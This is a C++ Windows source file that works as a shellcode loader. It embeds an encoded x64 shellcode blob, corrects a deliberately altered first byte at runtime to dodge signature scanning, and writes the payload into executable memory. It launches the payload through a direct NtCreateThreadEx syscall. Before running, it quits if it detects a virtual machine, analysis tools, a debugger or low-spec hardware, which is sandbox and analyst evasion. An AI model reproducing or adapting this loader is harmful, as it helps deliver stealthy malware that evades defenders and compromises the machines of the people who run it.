#include "CheckHardware.h"
#include "CheckDeviceNames.h"
#include "CheckRunningProcesses.h"
#include "AntiDebugging.h"
#include <Windows.h>
#include "SysCalls.h"

void Run()
{
	unsigned char code[] =
		"\x00\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef"
		"\xff\xff\xff\x48\xbb\x9c\x31\x86\xd6\xc6\xd4\x28\x6b\x48"
		"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x60\x79\x05"
		"\x32\x36\x3c\xe4\x6b\x9c\x31\xc7\x87\x87\x84\x7a\x23\xad"
		"\xe3\xd7\xb3\x8e\x5f\x7a\x0b\xca\x79\x0d\x84\xde\x9c\xa3"
		"\x39\xbc\x79\x89\x61\x8c\x9e\x60\xe0\xee\x61\xcb\xe7\x0f"
		"\x9c\x19\xab\x30\x0d\xe7\xaa\xc4\xf8\x08\x2a\x5d\xf8\x8b"
		"\x97\xc7\x15\xca\x86\xce\x70\xd7\x9e\x4d\x86\x08\xe0\xde"
		"\x0d\xce\xd7\x16\xb2\xa9\x13\x84\x3a\x84\xd9\x43\xa6\x28"
		"\x6b\x9c\xba\x06\x5e\xc6\xd4\x28\x23\x19\xf1\xf2\xb1\x8e"
		"\xd5\xf8\x2f\x17\x71\xa6\x5d\x8e\xcc\x78\x22\x9d\xe1\x65"
		"\x80\x8e\x2b\xe1\x26\xad\xf8\xc7\x5d\xf2\x5c\x60\x6a\x4a"
		"\x79\xb7\x16\x6a\x95\xe9\xa2\x91\x70\x87\x17\xfe\x34\x5d"
		"\x9a\xd0\x32\xca\xf2\xce\x91\x11\xba\xe9\xe9\xde\x92\x4d"
		"\x94\x0c\x22\x9d\xe1\xe0\x97\x4d\xd8\x60\x2f\x17\x71\x9a"
		"\x9f\xc7\x04\x69\xe0\x98\xb9\xce\xd7\x16\x95\x70\x2a\xc4"
		"\x6f\xdf\x8c\x87\x8c\x69\x32\xdd\x6b\xce\x55\x2a\xf4\x69"
		"\x39\x63\xd1\xde\x97\x9f\x8e\x60\xe0\x8e\xd8\xcd\x29\x39"
		"\x2b\x75\x22\x22\x46\xf5\xe4\x99\xe7\x1a\x6b\x9c\x70\xd0"
		"\x9f\x4f\x32\x60\xea\x70\x91\x87\xd6\xc6\x9d\xa1\x8e\xd5"
		"\x8d\x84\xd6\xd7\x88\xe8\xc3\x9d\x5b\xc7\x82\x8f\x5d\xcc"
		"\x27\x15\xc0\xc7\x6c\x8a\xa3\x0e\x6c\x63\xe4\xca\x5f\x2c"
		"\xbc\x29\x6a\x9c\x31\xdf\x97\x7c\xfd\xa8\x00\x9c\xce\x53"
		"\xbc\xcc\x95\x76\x3b\xcc\x7c\xb7\x1f\x8b\xe5\xe8\x23\x63"
		"\xf1\xce\x5f\x04\x9c\xd7\xab\xd4\xb8\x47\x97\x7c\x3e\x27"
		"\xb4\x7c\xce\x53\x9e\x4f\x13\x42\x7b\xdd\x69\xca\x5f\x24"
		"\x9c\xa1\x92\xdd\x8b\x1f\x73\xb2\xb5\xd7\xbe\x19\xf1\xf2"
		"\xdc\x8f\x2b\xe6\x1e\x79\xd9\x15\xd6\xc6\xd4\x60\xe8\x70"
		"\x21\xce\x5f\x24\x99\x19\xa2\xf6\x35\xc7\x8e\x8e\x5d\xd1"
		"\x2a\x26\x33\x5f\x1e\x99\x2b\xfd\xe8\x64\x31\xf8\x83\x8e"
		"\x57\xec\x4b\xc2\xb8\x70\xbc\x86\x95\x71\x03\x9c\x21\x86"
		"\xd6\x87\x8c\x60\xe2\x6e\x79\xb7\x1f\x87\x6e\x70\xcf\xcf"
		"\xd4\x79\x03\x8e\x5d\xeb\x22\x15\xf6\xcb\xe7\x0f\x9d\xa1"
		"\x9b\xd4\xb8\x5c\x9e\x4f\x2d\x69\xd1\x9e\xe8\x4e\x89\x39"
		"\x01\xab\x93\x9c\x4c\xae\x8e\x87\x83\x71\x03\x9c\x71\x86"
		"\xd6\x87\x8c\x42\x6b\xc6\x70\x3c\xdd\xe9\xdb\x18\x94\x49"
		"\x66\xdf\x97\x7c\xa1\x46\x26\xfd\xce\x53\x9f\x39\x1a\xc1"
		"\x57\x63\xce\x79\x9e\xc7\x17\x60\x42\x5a\x79\x03\x20\xb3"
		"\x60\x69\x94\x7b\x69\xec\xd6\x9f\x9d\xef\xa9\x6c\x84\x24"
		"\x80\x39\x01\x28\x6b";

	// Correct value
	char first[] = "\x48";

	PVOID pCode = VirtualAlloc(0, sizeof code, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	// Replace bad byte
	RtlCopyMemory(code, first, sizeof first);
	RtlCopyMemory(pCode, code, sizeof code);

	HANDLE hThread;
	HANDLE hProcess = GetCurrentProcess();

	//PVOID pCode = nullptr;
	SIZE_T size = sizeof code;

	//NtAllocateVirtualMemory(hProcess, &pCode, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//NtWriteVirtualMemory(hProcess, pCode, &code, size, nullptr);

	NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pCode, NULL, FALSE, NULL, NULL, NULL, NULL);
	WaitForSingleObject(hThread, INFINITE);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
{
	if (!SystemHasSufficientHardware() 
		|| SystemHasVmDeviceNames() 
		|| AnalysisToolsRunning() 
		|| IsBeingDebugged()) return 0;
	
	Run();
	return 0;
}